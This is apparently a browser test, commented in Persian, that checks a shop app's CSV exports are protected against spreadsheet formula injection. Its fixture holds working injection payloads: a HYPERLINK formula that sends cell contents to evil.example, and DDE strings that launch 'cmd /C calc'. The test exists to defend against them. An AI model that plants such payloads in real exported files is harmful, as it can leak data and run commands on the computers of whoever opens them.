/**
 * نسخهٔ وب — R10 (بازبینیِ دومِ دستهٔ ۴۴): هر چهار خروجیِ CSV ِ صفحه بی «فرمول» در اکسل، با کرومیومِ واقعی و دانلودِ واقعی.
 *
 *   • نامِ کالا «=HYPERLINK(…)»، «+cmd|…»، دستهٔ «-2+3»، مشتریِ «@SUM(…)» و شرحِ تراکنشِ «\t=…» در «گزارش‌ها» (محصولات و قرض‌داران)،
 *     «صورت‌حسابِ مشتری»، «انبارگردانی» و «گزارشِ تازه» ⇒ با «'» در آغاز (همان `finance-reports.cell` ِ سرور، `license/csv-cell.js`).
 *   • عددِ منفی (مانده و بدهیِ ۵۰۰-، اختلافِ انبارگردانی) همان عدد می‌ماند؛ پولِ منفیِ «گزارشِ تازه» (متنِ «-60.00») هم — متنِ
 *     فقط-عدد `^-?[0-9]+(\.[0-9]+)?$` فرمول نیست — ولی «-150.00%» «'» می‌گیرد؛ هیچ خانهٔ دیگری با = + - @ تب یا CR آغاز نمی‌شود.
 *   • axe بر نوارِ همان دکمه‌ها؛ هیچ خطای صفحه.
 *
 * اجرا:  node test/web-csv-export.mjs        (WEB_ROOT=<پوشه> برای سنجیدنِ نسخهٔ دیگری از صفحه، مثلاً پیش از این تغییر)
 * نبودِ پلی‌رایت قرمز است، نه «رد» (F0-17)؛ ردِ آگاهانه فقط با SKIP_BROWSER_TESTS=1.
 */
import { createRequire } from 'node:module';
import { missingTool, PLAYWRIGHT_INSTALL } from './browser-guard.mjs';
import assert from 'node:assert/strict';
import { execSync } from 'node:child_process';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';

const require = createRequire(import.meta.url);
const globalRoot = (() => { try { return execSync('npm root -g', { encoding: 'utf8' }).trim(); } catch { return ''; } })();
const pick = (name) => { for (const p of [`${globalRoot}/${name}`, name]) { try { return require(p); } catch { /* بعدی */ } } return null; };
const pw = pick('playwright');
if (!pw) missingTool('پلی‌رایت', PLAYWRIGHT_INSTALL);
let axeSrc = null;
for (const p of [`${globalRoot}/axe-core/axe.min.js`, path.join(import.meta.dirname, '..', 'node_modules', 'axe-core', 'axe.min.js'), process.env.AXE_PATH || '']) {
  if (p && fs.existsSync(p)) { axeSrc = fs.readFileSync(p, 'utf8'); break; }
}

const REPO = path.join(import.meta.dirname, '..', '..');
const ROOT = process.env.WEB_ROOT ? path.resolve(process.env.WEB_ROOT) : REPO;
const TYPES = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.png': 'image/png', '.svg': 'image/svg+xml', '.webmanifest': 'application/manifest+json' };
const server = http.createServer((req, res) => {
  const file = path.join(ROOT, decodeURIComponent(req.url.split('?')[0]).replace(/^\/+/, '') || 'index.html');
  if (!file.startsWith(ROOT) || !fs.existsSync(file) || fs.statSync(file).isDirectory()) { res.statusCode = 404; return res.end(); }
  res.setHeader('Content-Type', TYPES[path.extname(file)] || 'application/octet-stream');
  fs.createReadStream(file).pipe(res);
});
await new Promise(r => server.listen(0, '127.0.0.1', r));
const url = `http://127.0.0.1:${server.address().port}/index.html`;

//  دفترِ مرجعِ گزارش‌ها (همان web-report-fresh.mjs) با نام‌های بدخواه
const BAD = {
  link: '=HYPERLINK("http://evil.example/?x="&A1,"کلیک")',
  plus: "+cmd|' /C calc'!A0",
  minus: '-2+3',
  at: "@SUM(1+1)*cmd|' /C calc'!A0",
  tab: '\t=1+1',
};
const LEDGER = JSON.parse(fs.readFileSync(path.join(REPO, 'core/test-vectors/report-v1.json'), 'utf8')).ledgers.kabul;
LEDGER.products[0].name = BAD.link;
LEDGER.products[1].name = BAD.plus;
LEDGER.products[1].category = BAD.minus;
LEDGER.debtors[0].name = BAD.at;
//  «صابون» زیرِ بها فروخته شد (بها ۱۰۰، فروش ۴۰) ⇒ سودِ ناخالصِ ۶۰- و حاشیهٔ ۱۵۰-٪ در «گزارشِ تازه»
const SOAP = LEDGER.products[2];
SOAP.purchasePrice = 100;
LEDGER.warehouseEntries.find((w) => w.productId === SOAP.id).price = 100;
const D = LEDGER.debtors[0].id;
//  رسیدِ بیشتر از برد (۸۴۰) ⇒ ماندهٔ ۵۰۰- (عدد) در ردیفِ پایانی؛ شرحِ آغازشده با تب
LEDGER.transactions.push({ id: 'tx-r10', debtorId: D, type: 'receive', amount: 1340, date: '2026-10-14', notes: BAD.tab, createdAt: 1791929000000 });

/** CSV ⇐ ردیف‌ها (RFC 4180: نقل‌قول، «""»، CRLF؛ BOM ِ آغاز) */
function parse(text) {
  const s = text.replace(/^\uFEFF/, ''), rows = [];
  let row = [], cell = '', q = false;
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (q) {
      if (c === '"' && s[i + 1] === '"') { cell += '"'; i++; } else if (c === '"') q = false; else cell += c;
    } else if (c === '"' && cell === '') q = true;
    else if (c === ',') { row.push(cell); cell = ''; } else if (c === '\r' && s[i + 1] === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; i++; } else cell += c;
  }
  if (cell !== '' || row.length) { row.push(cell); rows.push(row); }
  return rows;
}
/** هیچ خانه‌ای فرمول نیست: آغازِ = + @ تب CR هرگز؛ «-» فقط متنِ فقط-عدد (همان الگوی `csv-cell.js`) */
function safe(rows, label) {
  for (const r of rows) for (const c of r) {
    assert.ok(!/^[=+@\t\r]/.test(c), `${label}: خانهٔ فرمول ${JSON.stringify(c)}`);
    assert.ok(!c.startsWith('-') || /^-[0-9]+(\.[0-9]+)?$/.test(c), `${label}: خانهٔ «-» ${JSON.stringify(c)}`);
  }
}
const cells = (rows) => rows.flat();

const browser = await pw.chromium.launch();
let failed = 0;
const step = async (name, fn) => {
  try { await fn(); console.log(`✅  ${name}`); } catch (e) { failed++; console.log(`❌  ${name}\n    ${e.message}`); }
};

const ctx = await browser.newContext({ viewport: { width: 1366, height: 900 }, timezoneId: 'Asia/Kabul', locale: 'fa-AF', acceptDownloads: true });
const pg = await ctx.newPage();
await pg.clock.setFixedTime(new Date('2026-10-14T05:30:00Z'));
const errors = [];
pg.on('pageerror', e => errors.push(String(e)));
await pg.goto(url);
await pg.evaluate((d) => {
  localStorage.setItem('tohid-shop-data-v1', JSON.stringify(d));
  localStorage.setItem('tohid-shop-auth-v1', JSON.stringify({ method: 'local', value: '', name: 'آزمون', loginAt: 1 }));
  //  «قرض‌داران» پشتِ اشتراک است (`vip.js`)؛ دکانِ مشترک
  localStorage.setItem('tohid-entitlement-v1', JSON.stringify({ source: 'paid', isPaid: true, features: ['sales', 'debtors'], trial: { used: true, active: false, daysLeft: 0 } }));
}, LEDGER);
await pg.reload();
await pg.waitForFunction(() => typeof window.goTo === 'function' && document.readyState === 'complete');
await pg.waitForTimeout(1200);
const skip = pg.getByText('ادامه بدون حساب');
if (await skip.first().isVisible().catch(() => false)) { await skip.first().click(); await pg.waitForTimeout(300); }
//  پیش از این تغییر چنین پرونده‌ای نیست ⇒ همان صفحهٔ دیروز (سرخ روی محتوا، نه این‌جا)
await pg.waitForFunction(() => window.TohidCsvCell, null, { timeout: 5000 }).catch(() => {});

/** کلیک ⇒ متنِ CSV ِ دانلودشده */
async function download(selector) {
  const [dl] = await Promise.all([pg.waitForEvent('download', { timeout: 10000 }), pg.click(selector)]);
  return parse(fs.readFileSync(await dl.path(), 'utf8'));
}

await step('«گزارش‌ها» ⇐ محصولات: نامِ «=HYPERLINK(…)» و «+cmd…» و دستهٔ «-2+3» با «\'»؛ عددها همان', async () => {
  await pg.evaluate(() => goTo('reports'));
  await pg.click('#reports-tabs .seg-btn[data-rtab="products"]');
  const rows = await download('#btn-export-report-csv');
  const all = cells(rows);
  assert.ok(all.includes(`'${BAD.link}`), JSON.stringify(rows.slice(0, 3)));
  assert.ok(all.includes(`'${BAD.plus}`));
  assert.ok(all.includes(`'${BAD.minus}`));
  safe(rows, 'محصولات');
});

await step('«گزارش‌ها» ⇐ قرض‌داران: نامِ «@SUM(…)» با «\'»؛ بدهیِ منفی همان عدد', async () => {
  await pg.click('#reports-tabs .seg-btn[data-rtab="debtors"]');
  const rows = await download('#btn-export-report-csv');
  const mine = rows.find((r) => r[0] === `'${BAD.at}`);
  assert.ok(mine, JSON.stringify(rows.slice(0, 3)));
  assert.match(mine[2], /^-[0-9]+$/, `بدهیِ منفی عدد می‌ماند: ${mine[2]}`);
  safe(rows, 'قرض‌داران');
});

await step('«صورت‌حسابِ مشتری»: شرحِ «\\t=…» با «\'»؛ ماندهٔ ۵۰۰- همان عدد', async () => {
  await pg.evaluate((id) => openAccount(id), D);
  const rows = await download('#btn-acc-statement-csv');
  const last = rows[rows.length - 1];
  assert.equal(last[1], `'${BAD.tab}`, JSON.stringify(rows));
  assert.equal(last[4], '-500', 'مانده عدد است، نه متن');
  safe(rows, 'صورت‌حساب');
});

await step('«انبارگردانی»: نامِ «=HYPERLINK(…)» با «\'»؛ اختلافِ منفی همان عدد', async () => {
  await pg.evaluate(() => goTo('warehouse'));
  await pg.click('#btn-stock-count-top');
  const id = LEDGER.products[0].id;
  await pg.fill(`[data-sc-id="${id}"]`, '0');
  let rows;
  try { rows = await download('#btn-sc-csv'); } finally { await pg.evaluate(() => closeModal('modal-stock-count')); }
  const line = rows.find((r) => r[0] === `'${BAD.link}`);
  assert.ok(line, JSON.stringify(rows));
  assert.match(line[4], /^-[0-9.]+$/, `اختلاف عدد است: ${line[4]}`);
  safe(rows, 'انبارگردانی');
});

await step('«گزارشِ تازه» (`report-ui.js`، همان `downloadCsv`): نامِ کالا با «\'»؛ پولِ منفی (متن) همان عدد، درصدِ منفی «\'»', async () => {
  await pg.evaluate(() => goTo('reports'));
  await pg.locator('#rep-fresh-toggle').check();
  await pg.click('#rep-fresh button[data-rtab="sales"]');
  await pg.click('#rep-fresh button[data-span="all"]');
  await pg.click('#rep-fresh button[data-dim="product"]');
  const rows = await download('#rep-fresh button[data-act="csv"]');
  const all = cells(rows);
  assert.ok(all.includes(`'${BAD.link}`), JSON.stringify(rows.slice(0, 4)));
  assert.ok(!all.includes(BAD.link));
  const head = rows[0], soap = rows.find((r) => r[0] === SOAP.name);
  assert.ok(soap, JSON.stringify(rows));
  assert.equal(soap[head.indexOf('سود ناخالص')], '-60.00', 'پولِ منفیِ متنی فقط-عدد است ⇒ بی «\'»');
  assert.equal(soap[head.indexOf('حاشیه')], "'-150.00%", 'درصد فقط-عدد نیست ⇒ «\'»');
  safe(rows, 'گزارشِ تازه');
});

await step('axe بر نوارِ دکمه‌های خروجی؛ هیچ خطای صفحه', async () => {
  if (!axeSrc) {
    if (process.env.SKIP_BROWSER_TESTS === '1') { console.log('⏭  axe-core پیدا نشد و SKIP_BROWSER_TESTS=1 است — آگاهانه رد شد'); return; }
    throw new Error('axe-core پیدا نشد (npm i -g axe-core@4.10.3، یا AXE_PATH) — «قبول» نیست');
  }
  await pg.evaluate(() => goTo('reports'));
  await pg.addScriptTag({ content: axeSrc });
  const v = await pg.evaluate(async () => (await window.axe.run(document.getElementById('btn-export-report-csv').parentElement,
    { runOnly: ['wcag2a', 'wcag2aa'] })).violations.map((x) => `${x.id}: ${x.nodes.map((n) => n.target.join(' ')).join(', ')}`));
  assert.deepEqual(v, []);
  assert.deepEqual(errors, []);
});

await browser.close();
server.close();
if (failed) { console.log(`\n${failed} گام سرخ`); process.exit(1); }
console.log('\nهمهٔ گام‌ها سبز');
